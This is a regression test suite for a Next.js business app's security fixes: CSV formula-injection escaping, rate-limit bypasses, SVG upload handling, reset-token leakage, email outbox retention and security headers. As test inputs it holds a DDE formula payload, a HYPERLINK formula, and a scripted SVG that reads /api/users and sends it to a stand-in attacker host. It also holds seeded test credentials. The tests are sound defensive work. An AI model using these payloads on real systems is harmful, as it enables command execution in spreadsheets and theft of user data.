// Regression cover for the reproduced public-site / email / export findings
// that can be exercised in a development-mode process:
//
//   * spreadsheet formula injection in the transaction, tax and project-expense
//     CSV exports;
//   * GET /api/project-expenses/report.csv answering POST and DELETE too;
//   * the lead export being the only export without Cache-Control;
//   * the lead form's single rate-limit bucket, defeated by rotating the User
//     Agent or spoofing CF-Connecting-IP;
//   * an uploaded SVG served back as executable script from this origin;
//   * a security-only SMTP configuration stalling the whole outbox;
//   * email_outbox keeping message bodies — live reset links included — forever;
//   * a worker that dies mid-send re-picking the same row with a full retry
//     budget;
//   * missing CSP and X-Frame-Options.
//
// Every test here fails on the commit before the fix.
//
// The server runs with a dedicated SECURITY_SMTP_* transport and NO operational
// credentials. That is the exact shape that stalled the outbox in production,
// and it also makes the security profile "deliverable", which is what stops the
// recovery endpoints handing a raw reset token back over HTTP.

import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { createClient } from "@libsql/client";
import { existsSync, rmSync, unlinkSync } from "node:fs";
import { createServer } from "node:net";
import { after, before, test } from "node:test";
import { csvCell, safeSpreadsheetText } from "../server/spreadsheet.ts";

let server;
let baseUrl;
let databasePath;
let uploadDirectory;
let database;
let cookie = "";

const WORKER_SECRET = "audit-email-worker-secret-2026";
// Nothing listens here, so every send fails with ECONNREFUSED immediately
// instead of spending the 15-second connection timeout.
const DEAD_SMTP_PORT = "1";

async function freePort() {
  return await new Promise((resolve, reject) => {
    const listener = createServer();
    listener.once("error", reject);
    listener.listen(0, "127.0.0.1", () => {
      const address = listener.address();
      listener.close(() => resolve(address.port));
    });
  });
}

async function waitForServer(url) {
  const deadline = Date.now() + 40_000;
  let lastError;
  while (Date.now() < deadline) {
    try {
      const response = await fetch(`${url}/api/health`);
      if (response.ok) return;
      lastError = new Error(`Health endpoint returned ${response.status}`);
    } catch (error) {
      lastError = error;
    }
    await new Promise((resolve) => setTimeout(resolve, 150));
  }
  throw lastError ?? new Error("Server did not become ready.");
}

async function request(path, options = {}) {
  const headers = new Headers(options.headers);
  if (cookie && options.anonymous !== true) headers.set("Cookie", cookie);
  if (
    options.body &&
    !(options.body instanceof FormData) &&
    !headers.has("Content-Type")
  ) {
    headers.set("Content-Type", "application/json");
  }
  const response = await fetch(`${baseUrl}${path}`, { ...options, headers });
  const setCookie = response.headers.get("set-cookie");
  if (setCookie) cookie = setCookie.split(";")[0];
  return response;
}

async function json(path, options = {}, expectedStatus = 200) {
  const response = await request(path, options);
  const payload = response.status === 204 ? null : await response.json();
  assert.equal(
    response.status,
    expectedStatus,
    `${path} -> ${response.status}: ${JSON.stringify(payload?.error ?? payload)}`,
  );
  return payload?.data;
}

let leadCounter = 0;

/** One public lead submission with fully controllable throttle inputs. */
async function submitLead({
  forwardedFor,
  cfConnectingIp,
  cfRay,
  userAgent,
  whatsapp,
  email,
} = {}) {
  leadCounter += 1;
  const headers = new Headers({
    "Content-Type": "application/json",
    "idempotency-key": `audit-lead-key-${String(leadCounter).padStart(6, "0")}-x`,
  });
  if (forwardedFor) headers.set("x-forwarded-for", forwardedFor);
  if (cfConnectingIp) headers.set("cf-connecting-ip", cfConnectingIp);
  if (cfRay) headers.set("cf-ray", cfRay);
  headers.set("user-agent", userAgent ?? "audit-agent/1.0");
  const response = await fetch(`${baseUrl}/api/cms/leads`, {
    method: "POST",
    headers,
    body: JSON.stringify({
      fullName: "Calon Pelanggan Audit",
      whatsapp: whatsapp ?? `08129900${String(1000 + leadCounter)}`,
      ...(email ? { email } : {}),
      location: "Denpasar",
      serviceInterest: "Internet Dedicated",
      message: "Mohon informasi paket internet untuk kantor kami.",
      privacyConsent: true,
    }),
  });
  return response.status;
}

before(async () => {
  const port = await freePort();
  baseUrl = `http://127.0.0.1:${port}`;
  databasePath = `/tmp/perumnet-public-surface-${process.pid}-${Date.now()}.db`;
  uploadDirectory = `/tmp/perumnet-public-surface-uploads-${process.pid}-${Date.now()}`;
  server = spawn(
    process.execPath,
    ["node_modules/next/dist/bin/next", "dev", "-H", "127.0.0.1", "-p", String(port)],
    {
      cwd: new URL("..", import.meta.url),
      env: {
        ...process.env,
        NEXT_TELEMETRY_DISABLED: "1",
        TURSO_DATABASE_URL: `file:${databasePath}`,
        APP_URL: baseUrl,
        UPLOAD_DIR: uploadDirectory,
        MAIL_BRANDING_MODE: "capture",
        EMAIL_MODE: "live",
        EMAIL_WORKER_SECRET: WORKER_SECRET,
        // Security profile only. No SMTP_HOST/SMTP_USER/SMTP_PASS on purpose.
        SECURITY_SMTP_HOST: "127.0.0.1",
        SECURITY_SMTP_PORT: DEAD_SMTP_PORT,
        SECURITY_SMTP_SECURE: "false",
        SECURITY_SMTP_USER: "security@perumnet.test",
        SECURITY_SMTP_PASS: "audit-security-smtp",
        SMTP_HOST: "",
        SMTP_PORT: "",
        SMTP_USER: "",
        SMTP_PASS: "",
        RESEND_API_KEY: "",
        TURNSTILE_SECRET_KEY: "",
      },
      stdio: ["ignore", "pipe", "pipe"],
    },
  );
  await waitForServer(baseUrl);
  database = createClient({ url: `file:${databasePath}` });
  const signIn = await request("/api/auth/login", {
    method: "POST",
    body: JSON.stringify({
      email: "admin@perumnet.id",
      password: "perumnet123",
      remember: false,
    }),
  });
  assert.equal(signIn.status, 200);
}, { timeout: 60_000 });

after(async () => {
  database?.close();
  if (server && !server.killed) {
    server.kill("SIGTERM");
    await new Promise((resolve) => {
      const timeout = setTimeout(resolve, 3_000);
      server.once("exit", () => {
        clearTimeout(timeout);
        resolve();
      });
    });
  }
  for (const suffix of ["", "-shm", "-wal"]) {
    const path = `${databasePath}${suffix}`;
    if (existsSync(path)) unlinkSync(path);
  }
  if (uploadDirectory) rmSync(uploadDirectory, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// Finding 2 — spreadsheet formula injection
// ---------------------------------------------------------------------------

const FORMULA_PROJECT = "=cmd|' /C calc'!A0 audit";
const FORMULA_LINK = '=HYPERLINK("http://evil.example","klik")';

test("the shared spreadsheet escape covers the prefixes Excel actually evaluates", () => {
  for (const payload of ["=1+1", "+1", "-1+1", "@SUM(A1)", "\t=1+1", "\r=1+1"]) {
    assert.equal(
      safeSpreadsheetText(payload),
      `'${payload}`,
      `${JSON.stringify(payload)} has to be neutralised`,
    );
  }
  // Plain text is left exactly as typed, and real numbers are never quoted:
  // prefixing "-500" would break every sum in the financial exports.
  assert.equal(safeSpreadsheetText("PT Sinar Bali"), "PT Sinar Bali");
  assert.equal(safeSpreadsheetText(-500), "-500");
  assert.equal(safeSpreadsheetText(null), "");
  // Always quoted, quotes always doubled — a conditional quote is one missed
  // case away from shifting every later column of the row.
  assert.equal(csvCell('a"b'), '"a""b"');
  assert.equal(csvCell("teks, dengan koma"), '"teks, dengan koma"');
  assert.equal(csvCell(FORMULA_LINK), `"'=HYPERLINK(""http://evil.example"",""klik"")"`);
});

let auditProject;

test("the financial CSV export neutralises a formula project name and description", async () => {
  auditProject = await json(
    "/api/projects",
    {
      method: "POST",
      body: JSON.stringify({
        name: FORMULA_PROJECT,
        client: "Klien Audit",
        location: "Denpasar",
        status: "Aktif",
        value: 1_000_000,
      }),
    },
    201,
  );
  await json(
    "/api/transactions",
    {
      method: "POST",
      body: JSON.stringify({
        projectId: auditProject.id,
        date: "2026-07-18",
        type: "Pengeluaran",
        description: FORMULA_LINK,
        amount: 125_000,
        source: "Operasional",
        category: "Operasional",
      }),
    },
    201,
  );

  const response = await request(
    `/api/transactions/report.csv?projectId=${auditProject.id}`,
  );
  assert.equal(response.status, 200);
  const csv = await response.text();
  assert.ok(
    csv.includes(`"'${FORMULA_PROJECT}"`),
    "the project name must reach the file as text, not as a formula",
  );
  assert.ok(
    csv.includes(`"'=HYPERLINK(""http://evil.example"",""klik"")"`),
    "the description must reach the file as text, not as a formula",
  );
  for (const line of csv.split("\r\n")) {
    for (const cell of line.split(",")) {
      assert.doesNotMatch(
        cell,
        /^"[=+@\t\r]/,
        `a cell still opens with a formula character: ${cell}`,
      );
    }
  }
});

test("the project-expense CSV export neutralises a formula merchant, and only answers GET", async () => {
  const categories = await json("/api/project-expense-categories");
  const category = categories.find((item) => item.name === "Material") ?? categories[0];
  assert.ok(category);
  await json(
    "/api/project-expenses",
    {
      method: "POST",
      body: JSON.stringify({
        projectId: auditProject.id,
        purchaseDate: "2026-07-30",
        merchant: FORMULA_PROJECT,
        categoryId: category.id,
        totalAmount: 150_000,
        fundingSource: "EmployeePaid",
        notes: "Belanja uji audit.",
        itemDetails: [],
      }),
    },
    201,
  );

  const response = await request("/api/project-expenses/report.csv");
  assert.equal(response.status, 200);
  const csv = await response.text();
  assert.ok(csv.includes(`"'${FORMULA_PROJECT}"`));

  // The report was dispatched before any method test, so a POST or a DELETE
  // returned the whole export.
  for (const method of ["POST", "DELETE"]) {
    const refused = await request("/api/project-expenses/report.csv", {
      method,
      ...(method === "POST" ? { body: JSON.stringify({}) } : {}),
    });
    assert.equal(refused.status, 405, `${method} must not return the export`);
    const payload = await refused.json();
    assert.equal(payload.error.code, "METHOD_NOT_ALLOWED");
    assert.match(payload.error.message, /hanya dapat diunduh/);
  }
});

test("the tax CSV export neutralises a formula rule name and quotes every cell", async () => {
  const rule = await json(
    "/api/tax/rules",
    {
      method: "POST",
      body: JSON.stringify({
        code: "AUDITX",
        name: FORMULA_LINK,
        nameEn: FORMULA_LINK,
        scope: "Client",
        effect: "Add",
        rateBps: 1_000,
        accountingTreatment: "Payable",
        status: "Active",
        sortOrder: 9,
      }),
    },
    201,
  );
  await json("/api/tax/settings", {
    method: "PATCH",
    body: JSON.stringify({ enabled: true }),
  });
  await json(
    `/api/boq/items?projectId=${auditProject.id}`,
    {
      method: "POST",
      body: JSON.stringify({
        category: "Jasa",
        description: "Pekerjaan uji audit",
        quantity: 1,
        unit: "paket",
        costPrice: 150_000,
        sellingPrice: 500_000,
      }),
    },
    201,
  );
  const invoice = await json(
    "/api/invoices",
    {
      method: "POST",
      body: JSON.stringify({
        projectId: auditProject.id,
        type: "Termin Pajak",
        issueDate: "2026-07-20",
        dueDate: "2026-08-03",
        amount: 300_000,
      }),
    },
    201,
  );
  const summary = await json(`/api/invoices/${invoice.id}/taxes`, {
    method: "PUT",
    body: JSON.stringify({ ruleIds: [rule.id] }),
  });
  // Obligations — the rows the report is built from — are only cut when the
  // snapshot locks, which happens on payment.
  await json(
    `/api/invoices/${invoice.id}/payments`,
    {
      method: "POST",
      body: JSON.stringify({
        grossAmount: summary.grossTotal,
        cashAmount: summary.grossTotal,
        withholdingAmount: 0,
        paidDate: "2026-07-29",
        paymentReference: "AUDIT-TAX-001",
        paymentMethod: "Tunai",
        attachment: {
          name: "bukti-pajak.png",
          mimeType: "image/png",
          contentBase64: Buffer.from("bukti-pembayaran-audit").toString("base64"),
        },
      }),
    },
    201,
  );

  const response = await request("/api/tax/report.csv");
  assert.equal(response.status, 200);
  const csv = await response.text();
  assert.ok(
    csv.includes(`"'=HYPERLINK(""http://evil.example"",""klik"")"`),
    "the tax rule name must reach the file as text, not as a formula",
  );
  // This export used to quote only cells containing " , CR or LF, so a value
  // with a leading space or an apostrophe left the file unquoted.
  for (const line of csv.split("\r\n").filter(Boolean)) {
    assert.match(line.replace(/^﻿/, ""), /^"/, `unquoted row: ${line}`);
  }
});

// ---------------------------------------------------------------------------
// Finding 9 — the lead export was the only one without Cache-Control
// ---------------------------------------------------------------------------

test("every customer-lead export refuses to be cached", async () => {
  for (const format of ["csv", "xlsx", "pdf"]) {
    const response = await request(`/api/cms/leads/export.${format}`);
    assert.equal(response.status, 200);
    assert.equal(
      response.headers.get("cache-control"),
      "private, no-store",
      `${format} export must not be cacheable`,
    );
  }
});

// ---------------------------------------------------------------------------
// Finding 3 — the lead form's rate limit
// ---------------------------------------------------------------------------

test("rotating the User-Agent no longer buys a fresh lead bucket", async () => {
  const ip = "198.51.100.7";
  const statuses = [];
  for (let attempt = 0; attempt < 7; attempt += 1) {
    statuses.push(
      await submitLead({
        forwardedFor: ip,
        userAgent: `rotating-agent/${attempt}.0`,
      }),
    );
  }
  assert.equal(statuses.filter((status) => status === 201).length, 5);
  assert.ok(
    statuses.slice(5).every((status) => status === 429),
    `expected the run to be blocked, got ${statuses.join(",")}`,
  );
});

test("rotating the source address no longer helps when the WhatsApp number stays the same", async () => {
  const whatsapp = "081298760001";
  const statuses = [];
  for (let attempt = 0; attempt < 7; attempt += 1) {
    statuses.push(
      await submitLead({
        forwardedFor: `203.0.113.${40 + attempt}`,
        userAgent: `spray-agent/${attempt}.0`,
        whatsapp,
      }),
    );
  }
  assert.equal(statuses.filter((status) => status === 201).length, 5);
  assert.ok(
    statuses.slice(5).every((status) => status === 429),
    `expected the contact bucket to block, got ${statuses.join(",")}`,
  );
});

test("CF-Connecting-IP is ignored unless the request really came through Cloudflare", async () => {
  // No CF-Ray: the header is whatever the caller typed, so it must not create a
  // new bucket. Distinct WhatsApp numbers keep the contact bucket out of it.
  const spoofed = [];
  for (let attempt = 0; attempt < 7; attempt += 1) {
    spoofed.push(
      await submitLead({
        forwardedFor: "198.51.100.90",
        cfConnectingIp: `192.0.2.${10 + attempt}`,
      }),
    );
  }
  assert.equal(spoofed.filter((status) => status === 201).length, 5);
  assert.ok(
    spoofed.slice(5).every((status) => status === 429),
    `spoofing CF-Connecting-IP must not reset the bucket, got ${spoofed.join(",")}`,
  );

  // With CF-Ray present the header is Cloudflare's own and is still honoured,
  // so genuine visitors behind the tunnel keep their own buckets.
  const genuine = [];
  for (let attempt = 0; attempt < 3; attempt += 1) {
    genuine.push(
      await submitLead({
        forwardedFor: "198.51.100.91",
        cfConnectingIp: `192.0.2.${100 + attempt}`,
        cfRay: `8f1e6c2a4b3d0${attempt}-CGK`,
      }),
    );
  }
  assert.deepEqual(genuine, [201, 201, 201]);
});

// ---------------------------------------------------------------------------
// Finding 4 — uploaded SVG served as script from this origin
// ---------------------------------------------------------------------------

test("an SVG partner logo is rasterised instead of being served back as script", async () => {
  const hostileSvg = `<svg xmlns="http://www.w3.org/2000/svg" width="240" height="120">
    <rect width="240" height="120" fill="#078e87" />
    <script>fetch('/api/users').then((r) => r.text()).then((t) => fetch('http://evil.example?d=' + encodeURIComponent(t)))</script>
  </svg>`;
  const form = new FormData();
  form.set("name", "Mitra Audit");
  form.set("organizationType", "partner");
  form.set("sortOrder", "1");
  form.set("isVisible", "true");
  form.set(
    "logo",
    new File([Buffer.from(hostileSvg)], "logo-mitra.svg", {
      type: "image/svg+xml",
    }),
  );
  const partner = await json(
    "/api/cms/partners",
    { method: "POST", body: form },
    201,
  );

  const media = await request(`/api/cms/partner-media/${partner.id}`);
  assert.equal(media.status, 200);
  assert.equal(
    media.headers.get("content-type"),
    "image/png",
    "an SVG must never leave this origin as image/svg+xml",
  );
  const bytes = Buffer.from(await media.arrayBuffer());
  assert.equal(bytes.subarray(1, 4).toString(), "PNG");
  assert.ok(
    !bytes.includes(Buffer.from("evil.example")),
    "the rasterised logo must not carry the original markup",
  );

  // The declared multipart type is caller input and is checked against the
  // actual bytes.
  const mismatched = new FormData();
  mismatched.set("name", "Mitra Palsu");
  mismatched.set("organizationType", "partner");
  mismatched.set(
    "logo",
    new File([Buffer.from(hostileSvg)], "logo-palsu.png", {
      type: "image/png",
    }),
  );
  const refused = await request("/api/cms/partners", {
    method: "POST",
    body: mismatched,
  });
  assert.equal(refused.status, 415);
  assert.equal((await refused.json()).error.code, "IMAGE_TYPE_MISMATCH");
});

test("a partner logo stored as SVG before the fix is downloaded, never executed", async () => {
  // Simulates the rows that already exist: the upload path can no longer
  // produce one, so it is written the way the old code wrote it.
  const partner = await json(
    "/api/cms/partners",
    {
      method: "POST",
      body: (() => {
        const form = new FormData();
        form.set("name", "Mitra Lama");
        form.set("organizationType", "partner");
        return form;
      })(),
    },
    201,
  );
  await database.execute({
    sql: "UPDATE cms_partners SET logo_storage_url=?,logo_mime_type=? WHERE id=?",
    args: ["local://cms-partner-legacy-audit", "image/svg+xml", partner.id],
  });
  const { writeFile, mkdir } = await import("node:fs/promises");
  await mkdir(uploadDirectory, { recursive: true });
  await writeFile(
    `${uploadDirectory}/cms-partner-legacy-audit`,
    '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
  );

  const media = await request(`/api/cms/partner-media/${partner.id}`);
  assert.equal(media.status, 200);
  assert.equal(media.headers.get("content-type"), "application/octet-stream");
  assert.match(
    media.headers.get("content-disposition") ?? "",
    /^attachment;/,
    "a legacy SVG must be handed over as a download",
  );
  assert.match(
    media.headers.get("content-security-policy") ?? "",
    /default-src 'none'/,
  );
});

// ---------------------------------------------------------------------------
// Finding 1 — the reset token must not ride back in the HTTP response
// ---------------------------------------------------------------------------

test("password recovery keeps its token when security mail can actually be delivered", async () => {
  const response = await fetch(`${baseUrl}/api/auth/forgot-password`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "x-forwarded-for": "198.51.100.150",
    },
    body: JSON.stringify({ email: "admin@perumnet.id" }),
  });
  assert.equal(response.status, 200);
  const payload = await response.json();
  assert.equal(
    payload.data.resetToken,
    undefined,
    "a deliverable security profile must never expose the raw token",
  );
  assert.match(payload.data.message, /tautan pemulihan/);
});

// ---------------------------------------------------------------------------
// Findings 5, 6 and 9c — the outbox
// ---------------------------------------------------------------------------

async function dispatchOutbox() {
  const response = await fetch(`${baseUrl}/api/internal/email-dispatch`, {
    method: "POST",
    headers: { authorization: `Bearer ${WORKER_SECRET}` },
  });
  assert.equal(response.status, 200);
  return (await response.json()).data;
}

test("a security-profile mail is delivered even though the operational profile is unconfigured", async () => {
  const before = await database.execute(
    "SELECT COUNT(*) AS total FROM email_outbox WHERE event_type='password_reset' AND status='Pending'",
  );
  assert.ok(
    Number(before.rows[0].total) >= 1,
    "the recovery mail should be queued on the security profile",
  );

  const result = await dispatchOutbox();
  assert.ok(
    result.processed >= 1,
    `the outbox stalled: ${JSON.stringify(result)}`,
  );

  const row = await database.execute(
    "SELECT status,attempt_count,last_error FROM email_outbox WHERE event_type='password_reset' ORDER BY created_at DESC LIMIT 1",
  );
  assert.equal(String(row.rows[0].status), "Failed");
  assert.equal(Number(row.rows[0].attempt_count), 1);
  assert.ok(
    row.rows[0].last_error,
    "a row that could not be delivered has to say why",
  );
});

test("a worker that dies mid-send does not hand the row back its full retry budget", async () => {
  const staleId = "audit-stale-lock-row";
  const past = new Date(Date.now() - 30 * 60_000).toISOString();
  const stale = new Date(Date.now() - 20 * 60_000).toISOString();
  await database.execute({
    sql: `INSERT INTO email_outbox
      (id,user_id,event_type,sender_profile,recipient,subject,body_html,status,provider,
       attempt_count,next_attempt_at,locked_at,last_error,created_at,updated_at)
      VALUES (?,NULL,'audit.stale','security','audit@perumnet.test','Uji lock basi',
        '<p>rahasia</p>','Processing','smtp',4,?,?,NULL,?,?)`,
    args: [staleId, past, stale, past, past],
  });

  await dispatchOutbox();

  const row = await database.execute({
    sql: "SELECT status,attempt_count,last_error FROM email_outbox WHERE id=? LIMIT 1",
    args: [staleId],
  });
  assert.equal(String(row.rows[0].status), "Failed");
  assert.equal(
    Number(row.rows[0].attempt_count),
    5,
    "releasing a dead worker's lock has to count as an attempt",
  );
  assert.equal(
    String(row.rows[0].last_error),
    "Worker lock expired",
    "the row must be out of budget, not re-attempted in the same tick",
  );
});

test("the outbox stops keeping message bodies and old rows forever", async () => {
  // A Skipped row is terminal the moment it is written — the lead notification
  // goes out on the unconfigured operational profile, so it never leaves.
  const skipped = await database.execute(
    "SELECT body_html FROM email_outbox WHERE event_type='cms.lead.created' ORDER BY created_at DESC LIMIT 1",
  );
  assert.ok(skipped.rows[0], "the lead notification should be in the outbox");
  assert.equal(
    String(skipped.rows[0].body_html ?? ""),
    "",
    "a skipped mail must not keep its body",
  );

  const oldId = "audit-old-terminal-row";
  const recentId = "audit-recent-terminal-row";
  const veryOld = new Date(Date.now() - 400 * 86_400_000).toISOString();
  const nowIso = new Date().toISOString();
  await database.batch(
    [
      // Sent long ago: past the retention window, so the whole row goes.
      {
        id: oldId,
        status: "Sent",
        attempts: 1,
        createdAt: veryOld,
      },
      // Failed with its retries exhausted: terminal, kept for the audit trail,
      // but stripped of the live reset link it carries.
      {
        id: recentId,
        status: "Failed",
        attempts: 5,
        createdAt: nowIso,
      },
    ].map((row) => ({
      sql: `INSERT INTO email_outbox
        (id,user_id,event_type,sender_profile,recipient,subject,body_html,status,provider,
         attempt_count,next_attempt_at,locked_at,last_error,created_at,updated_at)
        VALUES (?,NULL,'audit.terminal','security','audit@perumnet.test','Uji retensi',
          '<a href="https://app/admin?resetToken=rahasia">buka</a>',?,'smtp',
          ?,?,NULL,NULL,?,?)`,
      args: [row.id, row.status, row.attempts, nowIso, row.createdAt, nowIso],
    })),
    "write",
  );

  const result = await dispatchOutbox();
  assert.ok(result.redactedEmailBodies >= 1);
  assert.ok(result.deletedEmailRows >= 1);

  const survivors = await database.execute({
    sql: "SELECT id,body_html FROM email_outbox WHERE id IN (?,?)",
    args: [oldId, recentId],
  });
  assert.deepEqual(
    survivors.rows.map((row) => String(row.id)),
    [recentId],
    "a finished row older than the retention window has to be deleted",
  );
  assert.equal(
    String(survivors.rows[0].body_html ?? ""),
    "",
    "a finished row must not keep a live reset link",
  );

  // A body-less row cannot be re-queued into an empty message that looks sent.
  const refused = await request(`/api/notifications/email/${recentId}/retry`, {
    method: "POST",
  });
  assert.equal(refused.status, 409);
  const payload = await refused.json();
  assert.equal(payload.error.code, "EMAIL_BODY_PURGED");
  assert.match(payload.error.message, /tidak dapat dikirim ulang/);
});

// ---------------------------------------------------------------------------
// Finding 8 — security headers
// ---------------------------------------------------------------------------

test("every response carries a CSP and refuses to be framed", async () => {
  for (const path of ["/api/health", "/"]) {
    const response = await fetch(`${baseUrl}${path}`);
    const csp = response.headers.get("content-security-policy") ?? "";
    assert.match(csp, /frame-ancestors 'none'/, `${path} has no frame-ancestors`);
    assert.match(csp, /object-src 'none'/, `${path} allows <object>`);
    assert.match(csp, /default-src 'self'/, `${path} has no default-src`);
    assert.equal(response.headers.get("x-frame-options"), "DENY", path);
    assert.equal(response.headers.get("x-content-type-options"), "nosniff", path);
    assert.equal(
      response.headers.get("referrer-policy"),
      "strict-origin-when-cross-origin",
      path,
    );
    // The Turnstile widget on the public form has to keep working.
    assert.match(csp, /script-src[^;]*https:\/\/challenges\.cloudflare\.com/, path);
  }
});
